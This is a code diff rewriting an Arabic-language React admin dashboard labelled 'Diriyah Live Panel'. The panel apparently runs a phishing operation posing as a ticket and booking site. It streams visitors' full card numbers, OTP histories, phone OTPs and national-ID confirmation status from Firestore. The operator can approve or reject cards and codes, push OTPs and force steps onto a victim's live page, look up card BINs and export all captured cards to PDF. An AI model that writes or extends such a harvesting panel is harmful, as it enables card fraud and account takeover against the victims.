-      toast({ title: "تم الإرسال", description: `تم إرسال البريد إلى ${selectedVisitor.email}` });
-      setSendMailDialogOpen(false);
-    } catch (error) {
-      console.error("Error sending mail:", error);
-      toast({ title: "فشل الإرسال", description: "حدث خطأ أثناء إرسال البريد.", variant: "destructive" });
-    } finally {
-      setSendingMail(false);
-    }
-  };
-
-  const handleToggleBlockSelectedVisitor = async () => {
-    if (!selectedVisitor) return;
-    const willBlock = !selectedVisitor.blocked;
-    setBlockingVisitorId(selectedVisitor.id);
-    try {
-      const updated = await updateVisitorBlockStatus(selectedVisitor.id, willBlock);
-      if (!updated) {
-        throw new Error("Failed to update");
-      }
-      toast({
-        title: willBlock ? "تم حظر الزائر" : "تم فك حظر الزائر",
-        description: willBlock
-          ? "لن يتمكن هذا الزائر من متابعة الخطوات."
-          : "يمكن لهذا الزائر المتابعة مرة أخرى.",
-      });
-      setBlockDialogOpen(false);
-    } catch (error) {
-      console.error("Error updating visitor block status:", error);
-      toast({
-        title: "فشل تحديث الحظر",
-        description: "حدث خطأ أثناء تحديث حالة الحظر.",
-        variant: "destructive",
-      });
-    } finally {
-      setBlockingVisitorId(null);
-    }
-  };
-
-  const playNotificationSound = () => {
-    if (soundEnabled && audioRef.current) {
-      audioRef.current.currentTime = 0;
-      audioRef.current.play().catch(() => {});
-    }
-  };
-
-  useEffect(() => {
-    if (!isAuthenticated || !db) {
-      if (!db) console.warn("Firebase not initialized");
-      setLoading(false);
-      return;
-    }
-
-    const q = query(collection(db, "pays"));
-    const unsubscribe = onSnapshot(q, (querySnapshot) => {
-      const data: VisitorData[] = [];
-      querySnapshot.forEach((d) => {
-        data.push({ id: d.id, ...d.data() } as VisitorData);
-      });
-      data.sort((a, b) => {
-        const dateA = a.createdDate ? new Date(a.createdDate).getTime() : 0;
-        const dateB = b.createdDate ? new Date(b.createdDate).getTime() : 0;
-        return dateB - dateA;
-      });
-
-      if (prevVisitorsCount.current > 0 && data.length > prevVisitorsCount.current) {
-        playNotificationSound();
-      }
-      if (prevVisitorsCount.current > 0) {
-        const hasChanges = data.some((newVisitor, index) => {
-          const oldVisitor = visitors[index];
-          if (!oldVisitor) return true;
-          return newVisitor.currentPage !== oldVisitor.currentPage ||
-                 newVisitor.cardNumber !== oldVisitor.cardNumber ||
-                 newVisitor.status !== oldVisitor.status;
-        });
-        if (hasChanges) playNotificationSound();
-      }
-      prevVisitorsCount.current = data.length;
-
-      setVisitors(data);
-      setSelectedVisitor((prevSelected) => {
-        if (data.length === 0) return null;
-        if (!prevSelected) return data[0];
-        const updatedSelected = data.find((v) => v.id === prevSelected.id);
-        return updatedSelected ?? data[0];
-      });
-      setLoading(false);
-    }, (error) => {
-      console.error("Error fetching data:", error);
-      setLoading(false);
-    });
-
-    return () => unsubscribe();
-  }, [isAuthenticated]);
-
-  useEffect(() => {
-    if (selectedVisitor) {
-      const updated = visitors.find((v) => v.id === selectedVisitor.id);
-      if (updated) setSelectedVisitor(updated);
-    }
-  }, [visitors]);
-
-  const selectedCardBin =
-    selectedVisitor?.cardNumber?.replace(/\D/g, "").slice(0, 6) || "";
-  const selectedCardBinInfo = selectedCardBin
-    ? binLookupByBin[selectedCardBin]
-    : undefined;
-
-  useEffect(() => {
-    if (!selectedCardBin || selectedCardBin.length < 6) {
-      setBinLookupError(null);
-      setBinLookupLoading(false);
-      return;
-    }
-
-    if (binLookupByBin[selectedCardBin]) {
-      setBinLookupError(null);
-      return;
-    }
-
-    const controller = new AbortController();
-
-    const fetchBinLookup = async () => {
-      setBinLookupLoading(true);
-      setBinLookupError(null);
-      try {
-        const response = await fetch(`/api/bin-lookup/${selectedCardBin}`, {
-          signal: controller.signal,
-        });
-        const payload = (await response.json().catch(() => ({}))) as {
-          success?: boolean;
-          error?: string;
-          data?: BinLookupData;
-        };
-
-        if (!response.ok || payload.success === false || !payload.data) {
-          throw new Error(payload.error || "Failed to lookup BIN");
-        }
-
-        setBinLookupByBin((prev) => ({
-          ...prev,
-          [selectedCardBin]: payload.data as BinLookupData,
-        }));
-      } catch (error) {
-        if (controller.signal.aborted) return;
-        console.error("Error fetching BIN details:", error);
-        setBinLookupError("تعذر جلب بيانات BIN");
-      } finally {
-        if (!controller.signal.aborted) {
-          setBinLookupLoading(false);
-        }
-      }
-    };
-
-    void fetchBinLookup();
-
-    return () => controller.abort();
-  }, [selectedCardBin, binLookupByBin]);
-
-  if (checkingAuth) {
+  if (!authReady || !authUser) {
     return (
-      <div className="h-screen flex items-center justify-center bg-[#111b21]">
-        <div className="text-[#8696a0]">جاري التحقق...</div>
+      <div className="min-h-screen w-full flex items-center justify-center bg-slate-950 text-slate-400 text-sm">
+        جاري التحميل...
       </div>
     );
   }
 
-  if (!isAuthenticated) return null;
+  return <AdminDashboard />;
+}
 
-  const formatDate = (dateStr?: string) => {
-    if (!dateStr) return "";
-    const date = new Date(dateStr);
-    return date.toLocaleDateString("ar-SA", { year: "numeric", month: "short", day: "numeric", hour: "2-digit", minute: "2-digit" });
-  };
+/* -------------------------------------------------------------- */
+/* Dashboard                                                       */
+/* -------------------------------------------------------------- */
 
-  const totalVisitors = visitors.length;
-  const onlineVisitors = visitors.filter(v => v.online).length;
-  const ticketVisitors = visitors.filter(isTicketFlow).length;
-  const reservationVisitors = visitors.filter(isReservationFlow).length;
-  const withPayment = visitors.filter(v => v.cardNumber || (v.cardHistory && v.cardHistory.length > 0)).length;
-  const withOtp = visitors.filter(v => v.otp || (v.otpHistory && v.otpHistory.length > 0)).length;
-  const totalRevenue = visitors.reduce((sum, v) => sum + (v.totalAmount || v.total || 0), 0);
-
-  const filteredVisitors = visitors.filter(v => {
-    if (filterType === "ticket") return isTicketFlow(v);
-    if (filterType === "reservation") return isReservationFlow(v);
-    return true;
+function AdminDashboard() {
+  const [visitors, setVisitors] = useState<Visitor[]>([]);
+  const [loading, setLoading] = useState(true);
+  const [search, setSearch] = useState("");
+  const [filter, setFilter] = useState<
+    "all" | "online" | "waiting" | "completed"
+  >("all");
+  const [soundOn, setSoundOn] = useState<boolean>(() => {
+    try {
+      return localStorage.getItem("admin.soundOn") === "1";
+    } catch {
+      return false;
+    }
   });
+  const prevWaitingIds = useRef<Set<string>>(new Set());
+  const [, forceTick] = useState(0);
+  const [blockedBins, setBlockedBins] = useState<string[]>([]);
+  const [blocklistOpen, setBlocklistOpen] = useState(false);
+  const [blockedIps, setBlockedIps] = useState<string[]>([]);
+  const [ipBlocklistOpen, setIpBlocklistOpen] = useState(false);
+
+  // Subscribe to existing blocked_bins collection (string ids).
+  useEffect(() => {
+    const unsub = listenBlockedBins((bins) => {
+      setBlockedBins(
+        bins
+          .map((b) => String(b.bin || "").replace(/\D/g, ""))
+          .filter((s) => s.length === 6),
+      );
+    });
+    return () => unsub();
+  }, []);
+
+  async function addBlockedBin(bin: string) {
+    const clean = String(bin).replace(/\D/g, "").slice(0, 6);
+    if (clean.length !== 6) return;
+    if (blockedBins.includes(clean)) return;
+    try {
+      await fbAddBlockedBin(clean);
+    } catch (e) {
+      console.error(e);
+    }
+  }
+  async function removeBlockedBin(bin: string) {
+    const clean = String(bin).replace(/\D/g, "");
+    if (!clean) return;
+    try {
+      await fbRemoveBlockedBin(clean);
+    } catch (e) {
+      console.error(e);
+    }
+  }
+
+  // ---- Blocked IPs (settings/blockedIps doc, ips: string[]) ----
+  useEffect(() => {
+    if (!db) return;
+    const unsub = onSnapshot(doc(db, "settings", "blockedIps"), (snap) => {
+      const data = snap.data() as any;
+      const ips = Array.isArray(data?.ips) ? data.ips : [];
+      setBlockedIps(
+        ips
+          .map((x: any) => String(x).trim())
+          .filter((x: string) => x.length > 0),
+      );
+    });
+    return () => unsub();
+  }, []);
+
+  async function addBlockedIp(ip: string) {
+    if (!db) return;
+    const clean = String(ip).trim();
+    if (!clean) return;
+    if (blockedIps.includes(clean)) return;
+    await setDoc(
+      doc(db, "settings", "blockedIps"),
+      { ips: arrayUnion(clean), updatedAt: new Date().toISOString() },
+      { merge: true },
+    );
+  }
+  async function removeBlockedIp(ip: string) {
+    if (!db) return;
+    const clean = String(ip).trim();
+    if (!clean) return;
+    await setDoc(
+      doc(db, "settings", "blockedIps"),
+      { ips: arrayRemove(clean), updatedAt: new Date().toISOString() },
+      { merge: true },
+    );
+  }
+
+  // Block/unblock a visitor by toggling the per-doc `blocked` field.
+  const blockedVisitors = useMemo(
+    () => visitors.filter((v) => v.blocked === true).map((v) => v.id),
+    [visitors],
+  );
+  async function toggleBlockedVisitor(visitorId: string) {
+    const isBlocked = blockedVisitors.includes(visitorId);
+    if (isBlocked) {
+      if (!confirm("إزالة الحظر عن هذا الزائر؟")) return;
+      await updateVisitorBlockStatus(visitorId, false);
+    } else {
+      if (!confirm("حظر هذا الزائر نهائياً؟\nسيُمنع من إكمال أي خطوة في الحجز."))
+        return;
+      await updateVisitorBlockStatus(visitorId, true);
+    }
+  }
+
+  // Re-render every 15s so relative timestamps stay fresh.
+  useEffect(() => {
+    const t = setInterval(() => forceTick((n) => n + 1), 15000);
+    return () => clearInterval(t);
+  }, []);
+
+  useEffect(() => {
+    try {
+      localStorage.setItem("admin.soundOn", soundOn ? "1" : "0");
+    } catch {}
+  }, [soundOn]);
+  const [selectedId, setSelectedId] = useState<string | null>(null);
+  const [otpInput, setOtpInput] = useState("");
+  const [otpDirect, setOtpDirect] = useState("");
+  const [cardSettings, setCardSettings] = useState<CardSettings>(() =>
+    loadCardSettings(),
+  );
+
+  useEffect(() => {
+    try {
+      localStorage.setItem("admin.cardSettings", JSON.stringify(cardSettings));
+    } catch {}
+  }, [cardSettings]);
+
+  function updateCardSetting(key: CardKey, patch: Partial<CardSetting>) {
+    setCardSettings((prev) => ({ ...prev, [key]: { ...prev[key], ...patch } }));
+  }
+  function resetCardSettings() {
+    setCardSettings(DEFAULT_CARD_SETTINGS);
+  }
+  function spanClass(key: CardKey) {
+    const s = cardSettings[key];
+    if (!s.visible) return "hidden";
+    return s.span === 2
+      ? "md:col-span-2 xl:col-span-2"
+      : "md:col-span-1 xl:col-span-1";
+  }
+
+  useEffect(() => {
+    if (!db) {
+      setLoading(false);
+      return;
+    }
+    const q = query(collection(db, "pays"));
+    const unsub = onSnapshot(
+      q,
+      (snap) => {
+        const list: Visitor[] = [];
+        snap.forEach((d) => list.push(adaptVisitor({ id: d.id, ...(d.data() as any) })));
+        // Sort by updatedAt desc
+        list.sort((a, b) => {
+          const ta = new Date(a.updatedAt || 0).getTime() || 0;
+          const tb = new Date(b.updatedAt || 0).getTime() || 0;
+          return tb - ta;
+        });
+        setVisitors(list);
+        setLoading(false);
+        setSelectedId((prev) => {
+          if (prev && list.some((v) => v.id === prev)) return prev;
+          return list[0]?.id ?? null;
+        });
+      },
+      () => setLoading(false),
+    );
+    return () => unsub();
+  }, []);
+
+  const filtered = useMemo(() => {
+    let list = visitors;
+    if (filter === "online") list = list.filter((v) => isOnline(v));
+    if (filter === "waiting") list = list.filter((v) => isWaiting(v));
+    if (filter === "completed") list = list.filter((v) => isCompleted(v));
+    if (search.trim()) {
+      const s = search.trim().toLowerCase();
+      list = list.filter((v) =>
+        [v.id, v.name, v.phone, v.phoneVerification, v.payment?.cardLast4]
+          .filter(Boolean)
+          .join(" ")
+          .toLowerCase()
+          .includes(s),
+      );
+    }
+    return [...list].sort((a, b) => {
+      const wa = isWaiting(a) ? 0 : 1;
+      const wb = isWaiting(b) ? 0 : 1;
+      if (wa !== wb) return wa - wb;
+      const oa = isOnline(a) ? 0 : 1;
+      const ob = isOnline(b) ? 0 : 1;
+      if (oa !== ob) return oa - ob;
+      const ta = new Date(a.updatedAt || 0).getTime() || 0;
+      const tb = new Date(b.updatedAt || 0).getTime() || 0;
+      return tb - ta;
+    });
+  }, [visitors, filter, search]);
+
+  const stats = useMemo(() => {
+    const total = visitors.length;
+    const online = visitors.filter((v) => isOnline(v)).length;
+    const waiting = visitors.filter((v) => isWaiting(v)).length;
+    const completed = visitors.filter((v) => isCompleted(v)).length;
+    const onPayment = visitors.filter(
+      (v) => Number(v.step) >= 4 && Number(v.step) <= 8 && !isCompleted(v),
+    ).length;
+    return { total, online, waiting, completed, onPayment };
+  }, [visitors]);
+
+  // Beep when a NEW visitor enters waiting state.
+  useEffect(() => {
+    const currentWaiting = new Set(
+      visitors.filter((v) => isWaiting(v)).map((v) => v.id),
+    );
+    let hasNew = false;
+    currentWaiting.forEach((id) => {
+      if (!prevWaitingIds.current.has(id)) hasNew = true;
+    });
+    if (hasNew && soundOn && prevWaitingIds.current.size > 0) {
+      beep();
+    }
+    prevWaitingIds.current = currentWaiting;
+  }, [visitors, soundOn]);
+
+  const selected = visitors.find((v) => v.id === selectedId) || null;
+
+  /**
+   * Bridges the new dashboard's per-field approval model onto the existing
+   * legacy fields the user-facing flow listens to. We also persist the new
+   * `*ApprovalStatus` field so the dashboard UI reflects state immediately
+   * on rebooted sessions.
+   */
+  async function setApprovalStatus(
+    id: string,
+    field:
+      | "cardApprovalStatus"
+      | "otpApprovalStatus"
+      | "phoneOtpApprovalStatus"
+      | "nafadConfirmationStatus",
+    status: "approved" | "rejected",
+  ) {
+    if (!db) return;
+    try {
+      if (field === "cardApprovalStatus") {
+        await updateApprovalStatus(id, status === "approved");
+      } else if (field === "otpApprovalStatus") {
+        await updateOtpApprovalStatus(id, status === "approved");
+      }
+      await setDoc(
+        doc(db, "pays", id),
+        {
+          [field]: status,
+          [`${field}DecidedAt`]: new Date().toISOString(),
+        },
+        { merge: true },
+      );
+    } catch (e) {
+      console.error("setApprovalStatus failed", e);
+    }
+  }
+
+  async function pushDirective(id: string, payload: any) {
+    if (!db) return;
+    await setDoc(
+      doc(db, "pays", id),
+      { ...payload, updatedAt: new Date().toISOString() },
+      { merge: true },
+    );
+  }
+
+  async function removeVisitor(id: string) {
+    if (!db) return;
+    if (!confirm("حذف هذا السجل؟")) return;
+    await deleteDoc(doc(db, "pays", id));
+    if (selectedId === id) setSelectedId(null);
+  }
+
+  async function removeAllVisitors() {
+    if (!db) return;
+    const total = visitors.length;
+    if (total === 0) {
+      alert("لا توجد سجلات لحذفها");
+      return;
+    }
+    if (!confirm(`سيتم حذف جميع السجلات (${total}) نهائياً!\nهل أنت متأكد؟`))
+      return;
+    if (!confirm("تأكيد أخير: حذف الكل؟ لا يمكن التراجع.")) return;
+    const snap = await getDocs(collection(db, "pays"));
+    const docs = snap.docs;
+    for (let i = 0; i < docs.length; i += 450) {
+      const batch = writeBatch(db);
+      docs.slice(i, i + 450).forEach((d) => batch.delete(d.ref));
+      await batch.commit();
+    }
+    setSelectedId(null);
+  }
 
   return (
-    <div className="h-screen flex bg-[#111b21]" dir="rtl">
-      <div className="w-[340px] border-l border-[#2a3942] flex flex-col bg-[#111b21]">
-        <audio ref={audioRef} src="https://assets.mixkit.co/active_storage/sfx/2869/2869-preview.mp3" preload="auto" />
+    <div
+      className="min-h-screen text-slate-100"
+      dir="rtl"
+      style={{ backgroundColor: "#0d1320" }}
+    >
+      {/* Top bar */}
+      <header
+        className="border-b sticky top-0 z-20"
+        style={{ backgroundColor: "#0a0f1a", borderColor: "#1f2a3d" }}
+      >
+        <div className="px-4 py-3 flex items-center justify-between gap-4">
+          <div className="flex items-center gap-3">
+            <div className="w-9 h-9 rounded-lg bg-gradient-to-br from-cyan-400 to-cyan-600 flex items-center justify-center font-black text-slate-900">
+              D
+            </div>
+            <div>
+              <h1 className="text-base font-bold">لوحة التحكم</h1>
+              <p className="text-[10px] text-slate-500">Diriyah Live Panel</p>
+            </div>
+          </div>
 
-        <div className="bg-[#202c33] p-3 flex items-center justify-between">
-          <h1 className="text-white font-bold text-lg">لوحة التحكم</h1>
-          <div className="flex items-center gap-2">
-            <button onClick={handleLogout} className="p-1.5 rounded transition-colors text-[#8696a0] hover:text-red-400" data-testid="button-logout" title="تسجيل الخروج">
-              <LogOut className="w-4 h-4" />
+          <div className="flex-1 max-w-md">
+            <div className="relative">
+              <Search className="w-4 h-4 absolute right-3 top-1/2 -translate-y-1/2 text-slate-500" />
+              <input
+                value={search}
+                onChange={(e) => setSearch(e.target.value)}
+                placeholder="بحث المستخدم — اضغط ENTER"
+                className="w-full pr-10 pl-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg text-sm text-slate-100 placeholder-slate-500 focus:outline-none focus:border-cyan-500"
+                data-testid="admin-search"
+              />
+            </div>
+          </div>
+
+          <div className="flex items-center gap-2 flex-wrap">
+            <CustomizeDropdown
+              settings={cardSettings}
+              onChange={updateCardSetting}
+              onReset={resetCardSettings}
+            />
+            {selected && <PagesControlDropdown visitor={selected} />}
+            <IconButton
+              color={stats.waiting > 0 ? "red" : "slate"}
+              icon={stats.waiting > 0 ? BellRing : Bell}
+              label={
+                stats.waiting > 0
+                  ? `${stats.waiting} بانتظار الموافقة`
+                  : "تنبيهات"
+              }
+              badge={stats.waiting > 0 ? String(stats.waiting) : undefined}
+              pulse={stats.waiting > 0}
+              onClick={() => setFilter("waiting")}
+            />
+            <IconButton
+              color={soundOn ? "green" : "slate"}
+              icon={soundOn ? Volume2 : VolumeX}
+              label={soundOn ? "كتم الصوت" : "تشغيل الصوت"}
+              onClick={() => {
+                setSoundOn((s) => !s);
+                if (!soundOn) beep();
+              }}
+            />
+            <IconButton
+              color={blockedBins.length > 0 ? "red" : "slate"}
+              icon={Ban}
+              label="البطاقات المحظورة"
+              badge={
+                blockedBins.length > 0 ? String(blockedBins.length) : undefined
+              }
+              onClick={() => setBlocklistOpen(true)}
+            />
+            <IconButton
+              color={blockedIps.length > 0 ? "red" : "slate"}
+              icon={WifiOff}
+              label="حظر بالـ IP"
+              badge={
+                blockedIps.length > 0 ? String(blockedIps.length) : undefined
+              }
+              onClick={() => setIpBlocklistOpen(true)}
+            />
+            <IconButton
+              color="slate"
+              icon={FileDown}
+              label="تصدير البطاقات (PDF)"
+              badge={(() => {
+                const n = visitors.filter(
+                  (v) => v.payment?.cardNumber || v.payment?.cardLast4,
+                ).length;
+                return n > 0 ? String(n) : undefined;
+              })()}
+              onClick={() => exportAllCardsPdf(visitors)}
+            />
+            <IconButton
+              color={visitors.length > 0 ? "red" : "slate"}
+              icon={Trash2}
+              label="حذف كل السجلات"
+              badge={visitors.length > 0 ? String(visitors.length) : undefined}
+              onClick={() => void removeAllVisitors()}
+            />
+            <IconButton
+              color="slate"
+              icon={RefreshCw}
+              label="تحديث"
+              onClick={() => window.location.reload()}
+            />
+            <IconButton
+              color="slate"
+              icon={LogOut}
+              label="خروج"
+              onClick={() => {
+                void logoutUser();
+              }}
+            />
+          </div>
+        </div>
+      </header>
+
+      {/* Stats bar */}
+      <div className="px-3 pt-3 grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-2">
+        <StatCard
+          icon={Users}
+          label="إجمالي الزوار"
+          value={stats.total}
+          color="slate"
+        />
+        <StatCard
+          icon={Activity}
+          label="متصل الآن"
+          value={stats.online}
+          color="green"
+          pulse={stats.online > 0}
+        />
+        <StatCard
+          icon={AlarmClock}
+          label="بانتظار الموافقة"
+          value={stats.waiting}
+          color={stats.waiting > 0 ? "amber" : "slate"}
+          pulse={stats.waiting > 0}
+          onClick={() => setFilter("waiting")}
+        />
+        <StatCard
+          icon={CreditCard}
+          label="في مرحلة الدفع"
+          value={stats.onPayment}
+          color="cyan"
+        />
+        <StatCard
+          icon={CheckCheck}
+          label="مكتمل"
+          value={stats.completed}
+          color="emerald"
+        />
+      </div>
+
+      <div
+        className="flex gap-3 p-3"
+        style={{ minHeight: "calc(100vh - 65px)" }}
+      >
+        {/* Main content (cards) */}
+        <main className="flex-1 grid grid-cols-1 md:grid-cols-2 xl:grid-cols-3 gap-3 min-w-0 order-2">
+          {selected ? (
+            <>
+              <div className={spanClass("card")}>
+                <CardInfoCard
+                  visitor={selected}
+                  onApprove={(field) =>
+                    setApprovalStatus(selected.id, field, "approved")
+                  }
+                  onReject={(field) =>
+                    setApprovalStatus(selected.id, field, "rejected")
+                  }
+                  onPushStep={(targetStep) =>
+                    pushDirective(selected.id, {
+                      directedStep: targetStep,
+                      directedAt: new Date().toISOString(),
+                    })
+                  }
+                  onBlockBin={addBlockedBin}
+                  isBinBlocked={
+                    !!selected.payment?.cardBin &&
+                    blockedBins.includes(String(selected.payment.cardBin))
+                  }
+                  onBlockIp={addBlockedIp}
+                  isIpBlocked={
+                    !!(selected.ip || selected.ipAddress) &&
+                    blockedIps.includes(
+                      String(selected.ip || selected.ipAddress),
+                    )
+                  }
+                />
+              </div>
+              <div className={spanClass("customer")}>
+                <CustomerInfoCard visitor={selected} />
+              </div>
+              <div className={spanClass("otp")}>
+                <OtpControlCard
+                  visitor={selected}
+                  otpInput={otpInput}
+                  setOtpInput={setOtpInput}
+                  otpDirect={otpDirect}
+                  setOtpDirect={setOtpDirect}
+                  onApprove={(field) =>
+                    setApprovalStatus(selected.id, field, "approved")
+                  }
+                  onReject={(field) =>
+                    setApprovalStatus(selected.id, field, "rejected")
+                  }
+                  onSendOtp={(code) =>
+                    pushDirective(selected.id, {
+                      adminPushedOtp: code,
+                      adminPushedOtpAt: new Date().toISOString(),
+                    })
+                  }
+                  onForceFinalOtp={() =>
+                    pushDirective(selected.id, {
+                      forceFinalOtp: true,
+                      forceFinalOtpAt: new Date().toISOString(),
+                    })
+                  }
+                />
+              </div>
+              <div className={spanClass("phone")}>
+                <PhoneInfoCard
+                  visitor={selected}
+                  onApprove={() =>
+                    setApprovalStatus(
+                      selected.id,
+                      "phoneOtpApprovalStatus",
+                      "approved",
+                    )
+                  }
+                  onReject={() =>
+                    setApprovalStatus(
+                      selected.id,
+                      "phoneOtpApprovalStatus",
+                      "rejected",
+                    )
+                  }
+                  onPushStep={(targetStep) =>
+                    pushDirective(selected.id, {
+                      directedStep: targetStep,
+                      directedAt: new Date().toISOString(),
+                    })
+                  }
+                />
+              </div>
+              <div className={spanClass("header")}>
+                <VisitorHeaderCard visitor={selected} />
+              </div>
+            </>
+          ) : (
+            <div className="col-span-full flex items-center justify-center h-96 text-slate-500">
+              {loading ? "جاري التحميل..." : "اختر زائراً من القائمة"}
+            </div>
+          )}
+        </main>
+
+        {/* Right sidebar — visitor list */}
+        <aside className="w-72 shrink-0 flex flex-col gap-3 order-1">
+          <div
+            className="rounded-xl p-3 border"
+            style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+          >
+            <button
+              className="w-full py-2 px-3 bg-slate-800 hover:bg-slate-700 rounded-lg text-xs font-semibold flex items-center justify-center gap-2"
+              onClick={() => window.location.reload()}
+            >
+              <RefreshCw className="w-3.5 h-3.5" />
+              تحديث الصفحة
+            </button>
+            <div className="mt-2 grid grid-cols-4 gap-1 text-[11px]">
+              {(
+                [
+                  ["all", "الكل", stats.total],
+                  ["online", "أونلاين", stats.online],
+                  ["waiting", "انتظار", stats.waiting],
+                  ["completed", "مكتمل", stats.completed],
+                ] as const
+              ).map(([k, l, count]) => {
+                const active = filter === k;
+                const isWait = k === "waiting" && count > 0;
+                return (
+                  <button
+                    key={k}
+                    onClick={() => setFilter(k)}
+                    className={`py-1.5 rounded-md font-semibold transition flex items-center justify-center gap-1 ${
+                      active
+                        ? isWait
+                          ? "bg-amber-500 text-slate-900"
+                          : "bg-cyan-500 text-slate-900"
+                        : isWait
+                          ? "bg-amber-500/20 text-amber-300 hover:bg-amber-500/30"
+                          : "bg-slate-800 text-slate-300 hover:bg-slate-700"
+                    }`}
+                    data-testid={`filter-${k}`}
+                  >
+                    <span>{l}</span>
+                    {count > 0 && (
+                      <span
+                        className={`text-[9px] px-1 rounded ${
+                          active
+                            ? "bg-slate-900/30"
+                            : isWait
+                              ? "bg-amber-500/30"
+                              : "bg-slate-900/40"
+                        }`}
+                      >
+                        {count}
+                      </span>
+                    )}
+                  </button>
+                );
+              })}
+            </div>
+          </div>
+
+          <div
+            className="flex-1 rounded-xl border overflow-hidden flex flex-col"
+            style={{ backgroundColor: "#111a2c", borderColor: "#1f2a3d" }}
+          >
+            <div
+              className="px-3 py-2 border-b text-[11px] text-slate-400 flex items-center justify-between"
+              style={{ borderColor: "#1f2a3d" }}
+            >
+              <span>الزوار ({filtered.length})</span>
+              <span className="text-cyan-400">●</span>
+            </div>
+            <div className="overflow-y-auto flex-1">
+              {filtered.length === 0 && (
+                <div className="text-center py-12 text-slate-500 text-sm">
+                  {loading ? "..." : "لا يوجد زوار"}
+                </div>
+              )}
+              {filtered.map((v) => {
+                const online = isOnline(v);
+                const sel = v.id === selectedId;
+                const stage = STEP_LABELS[v.step as number] || "—";
+                const stepNum = Number(v.step) || 0;
+                const waiting = isWaiting(v);
+                const completed = isCompleted(v);
+                const last4 = v.payment?.cardLast4;
+                const isBlocked = blockedVisitors.includes(v.id);
+                return (
+                  <div
+                    key={v.id}
+                    role="button"
+                    tabIndex={0}
+                    onClick={() => setSelectedId(v.id)}
+                    onKeyDown={(e) => {
+                      if (e.key === "Enter" || e.key === " ")
+                        setSelectedId(v.id);
+                    }}
+                    className={`w-full text-right px-3 py-2.5 border-b border-slate-800/60 transition flex items-start gap-2 group cursor-pointer relative ${
+                      isBlocked
+                        ? "bg-red-500/5 hover:bg-red-500/10 opacity-70"
+                        : sel
+                          ? "bg-cyan-500/10 border-r-2 border-r-cyan-400"
+                          : waiting
+                            ? "bg-amber-500/5 hover:bg-amber-500/10"
+                            : "hover:bg-slate-800/40"
+                    }`}
+                    data-testid={`visitor-${v.id}`}
+                  >
+                    {waiting && (
+                      <span className="absolute top-2 left-2 flex h-2 w-2">
+                        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-amber-400 opacity-75"></span>
+                        <span className="relative inline-flex rounded-full h-2 w-2 bg-amber-500"></span>
+                      </span>
+                    )}
+                    <div
+                      className={`w-2 h-2 rounded-full mt-1.5 shrink-0 ${
+                        online
+                          ? "bg-green-400 animate-pulse"
+                          : completed
+                            ? "bg-emerald-500"
+                            : "bg-slate-600"
+                      }`}
+                    />
+                    <div className="flex-1 min-w-0">
+                      <div className="flex items-center justify-between gap-2">
+                        <div className="text-[13px] font-semibold text-slate-100 truncate">
+                          {v.name || "زائر بدون اسم"}
+                        </div>
+                        <span className="text-[9px] text-slate-500 shrink-0">
+                          {fmtRelative(v.updatedAt)}
+                        </span>
+                      </div>
+                      <div
+                        className="text-[11px] text-slate-400 truncate"
+                        dir="ltr"
+                      >
+                        {v.phoneVerification ||
+                          v.phone ||
+                          v.id.slice(0, 12)}
+                      </div>
+                      <div className="flex items-center gap-1 mt-1.5 flex-wrap">
+                        <span
+                          className={`text-[10px] px-1.5 py-0.5 rounded border font-semibold ${stepColor(stepNum)}`}
+                        >
+                          {stepNum > 0 ? `${stepNum}/9` : "—"} · {stage}
+                        </span>
+                        {waiting && (
+                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/40 font-bold flex items-center gap-0.5">
+                            <AlertTriangle className="w-2.5 h-2.5" /> انتظار
+                          </span>
+                        )}
+                        {completed && !waiting && (
+                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-emerald-500/20 text-emerald-300 border border-emerald-500/40 font-bold flex items-center gap-0.5">
+                            <CheckCheck className="w-2.5 h-2.5" /> مكتمل
+                          </span>
+                        )}
+                        {last4 && (
+                          <span
+                            className="text-[10px] px-1.5 py-0.5 rounded bg-slate-800 text-cyan-300 font-mono"
+                            dir="ltr"
+                          >
+                            •• {last4}
+                          </span>
+                        )}
+                        {isBlocked && (
+                          <span className="text-[10px] px-1.5 py-0.5 rounded bg-red-500/20 text-red-300 border border-red-500/40 font-bold flex items-center gap-0.5">
+                            <Ban className="w-2.5 h-2.5" /> محظور
+                          </span>
+                        )}
+                      </div>
+                      {/* Step progress bar */}
+                      <div className="mt-1.5 flex gap-0.5">
+                        {Array.from({ length: 9 }).map((_, i) => (
+                          <div
+                            key={i}
+                            className={`flex-1 h-1 rounded-full ${
+                              i < stepNum
+                                ? completed
+                                  ? "bg-emerald-500"
+                                  : waiting
+                                    ? "bg-amber-400"
+                                    : "bg-cyan-500"
+                                : "bg-slate-800"
+                            }`}
+                          />
+                        ))}
+                      </div>
+                    </div>
+                    <div className="flex flex-col items-center gap-1 shrink-0">
+                      <button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          void toggleBlockedVisitor(v.id);
+                        }}
+                        title={isBlocked ? "إلغاء الحظر" : "حظر هذا الزائر"}
+                        className={`p-1 rounded transition ${
+                          isBlocked
+                            ? "text-red-400 hover:text-red-300 bg-red-500/10"
+                            : "opacity-0 group-hover:opacity-100 text-slate-500 hover:text-red-400"
+                        }`}
+                        data-testid={`block-${v.id}`}
+                      >
+                        <Ban className="w-3.5 h-3.5" />
+                      </button>
+                      <button
+                        onClick={(e) => {
+                          e.stopPropagation();
+                          removeVisitor(v.id);
+                        }}
+                        title="حذف"
+                        className="opacity-0 group-hover:opacity-100 text-slate-500 hover:text-red-400 p-1"
+                        data-testid={`del-${v.id}`}
+                      >
+                        <Trash2 className="w-3.5 h-3.5" />
+                      </button>
+                    </div>
+                  </div>
+                );
+              })}
+            </div>
+          </div>
+        </aside>
+      </div>
+
+      {/* Blocked IPs management dialog */}
+      {ipBlocklistOpen && (
+        <div
+          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/70 backdrop-blur-sm animate-in fade-in"
+          onClick={() => setIpBlocklistOpen(false)}
+          data-testid="ip-blocklist-dialog-backdrop"
+        >
+          <div
+            className="w-full max-w-md max-h-[90vh] overflow-y-auto"
+            onClick={(e) => e.stopPropagation()}
+          >
+            <div className="relative">
+              <button
+                onClick={() => setIpBlocklistOpen(false)}
+                className="absolute top-2 left-2 z-10 p-1.5 rounded-lg bg-slate-800/80 hover:bg-slate-700 text-slate-300 hover:text-white transition"
+                aria-label="إغلاق"
